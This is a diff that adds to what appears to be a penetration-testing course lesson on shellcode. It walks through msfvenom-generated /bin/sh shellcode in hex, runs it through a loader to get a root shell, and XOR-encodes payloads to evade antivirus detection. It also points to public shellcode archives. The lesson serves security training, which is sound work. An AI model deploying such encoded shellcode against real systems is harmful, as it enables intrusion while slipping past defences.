@@ -156,5 +156,87 @@ Final size of hex file: 96 bytes
 Note that this shellcode is also not as optimized and short as our shellcode. Let's try running this shellcode with our `loader.py` script:
 
 ```
-z0x9n@htb[/htb]$ python3 loader.py '6a3b589948bb2f62696e2f736
+z0x9n@htb[/htb]$ python3 loader.py '6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80300000073680056574889e60f05'
+
+$ whoami
+
+root
 ```
+
+This shellcode works as well. Try testing other types of syscalls and payloads in shellcraft and msfvenom
+
+## Shellcode Encoding
+
+Another great benefit of using these tools is to encode our shellcodes without manually writing our encoders. Encoding shellcodes can become a handy feature for systems with anti-virus or certain security protections. However, it must be noted that shellcodes encoded with common encoders may be easy to detect.
+
+We can use msfvenom to encode our shellcodes as well. We can first list available encoders:
+
+```
+
+z0x9n@htb[/htb]$ msfvenom -l encoders
+
+# Framework Encoders [--encoder <value>]
+
+    Name                          Rank       Description
+    ----                          ----       -----------
+    cmd/brace                     low        Bash Brace Expansion Command Encoder
+    cmd/echo                      good       Echo Command Encoder
+
+<SNIP>
+```
+
+Then we can pick one for x64, like x64/xor, and use it with the -e flag, as follows:
+
+```
+z0x9n@htb[/htb]$ msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'
+
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x64/xor
+x64/xor succeeded with size 87 (iteration=0)
+x64/xor chosen with final size 87
+Payload size: 87 bytes
+Final size of hex file: 174 bytes
+4831c94881e9faffffff488d05efffffff48bbf377c2ea294e325c48315827482df8ffffffe2f4994c9a7361f51d3e9a19ed99414e61147a90aac74a4e32147a9190022a4e325c801fc2bc7e06bbbafc72c2ea294e325c
+```
+
+Let's try running the encoded shellcode to see if it runs:
+
+```
+z0x9n@htb[/htb]$ python3 loader.py '4831c94881e9faffffff488d05efffffff48bbf377c2ea294e325c48315827482df8ffffffe2f4994c9a7361f51d3e9a19ed99414e61147a90aac74a4e32147a9190022a4e325c801fc2bc7e06bbbafc72c2ea294e325c'
+
+$ whoami
+
+root
+```
+
+As we can see, the encoded shellcode works as well while being a little bit less detectable by security monitoring tools.
+
+Tip: We can encoded our shellcode multiple times with the `-i COUNT` flag, and specify the number of iterations we want.
+
+We see that the encoded shellcode is always significantly larger than the non-encoded one since encoding a shellcode adds a built-in decoder for runtime decoding. It may also encode each byte multiple times, which increases its size at every iteration.
+
+If we had a custom shellcode that we wrote, we could use msfvenom to encode it as well, by writing its bytes to a file and then passing it to msfvenom with `-p -`, as follows:
+
+```
+z0x9n@htb[/htb]$ python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05'))" > shell.bin
+z0x9n@htb[/htb]$ msfvenom -p - -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor' < shell.bin
+
+Attempting to read payload from STDIN...
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x64/xor
+x64/xor succeeded with size 71 (iteration=0)
+x64/xor chosen with final size 71
+Payload size: 71 bytes
+Final size of hex file: 142 bytes
+4831c94881e9fcffffff488d05efffffff48bb5a63e4e17d0bac1348315827482df8ffffffe2f4ea58acd0af59e4ac75018d8f5224df7b0d2b6d062f5ce49abc6ce1e17d0bac13
+```
+
+As we can see, our payload was encoded and became much larger as well.
+
+## Shellcode Resources
+
+Finally, we can always search online resources like Shell-Storm or Exploit DB for existing shellcodes.
+
+For example, if we search Shell-Storm for a /bin/sh shellcode on Linux/x86_64, we will find several examples of varying sizes, like [this 27-bytes shellcode](http://shell-storm.org/shellcode/files/shellcode-806.php). We can search Exploit DB for the same, and we find a [more optimized 22-bytes shellcode](https://www.exploit-db.com/shellcodes/46901), which can be helpful if our Binary Exploitation only had around 22-bytes of overflow space. We can also search for encoded shellcodes, which are bound to be larger.
+
+The shellcode we wrote above is 27-bytes long as well, so it looks to be a very optimized shellcode. With all of that, we should be comfortable with writing, generating, and using shellcodes.
